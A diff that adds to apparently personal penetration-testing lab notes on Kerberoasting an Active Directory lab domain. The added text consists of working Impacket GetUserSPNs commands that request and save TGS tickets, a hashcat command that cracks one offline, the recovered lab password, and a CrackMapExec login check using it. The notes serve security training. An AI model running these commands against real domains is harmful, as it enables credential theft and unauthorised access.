@@ -67,3 +67,37 @@ GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 ```
 
 <figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+### Requesting all TGS Tickets
+
+```
+GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+### Saving the TGS Ticket to an Output File
+
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+```
+
+* In this example, we will write the <mark style="color:yellow;">TGS ticket for the sqldev user in a file named sqldev\_tgs</mark>
+* We can now crack the ticket offline using Hashcat!
+* The Hashcat format is 13100
+
+## Cracking the Ticket Offline with Hashcat
+
+```
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+```
+
+* We get the password of <mark style="color:yellow;">database!</mark>
+
+## Testing Authentication to a Domain Controller
+
+* Upon successful cracking of the TGS ticket, we can use CrackMapExec (CME) to test our new creds and validate our authentication
+
+```
+sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+```
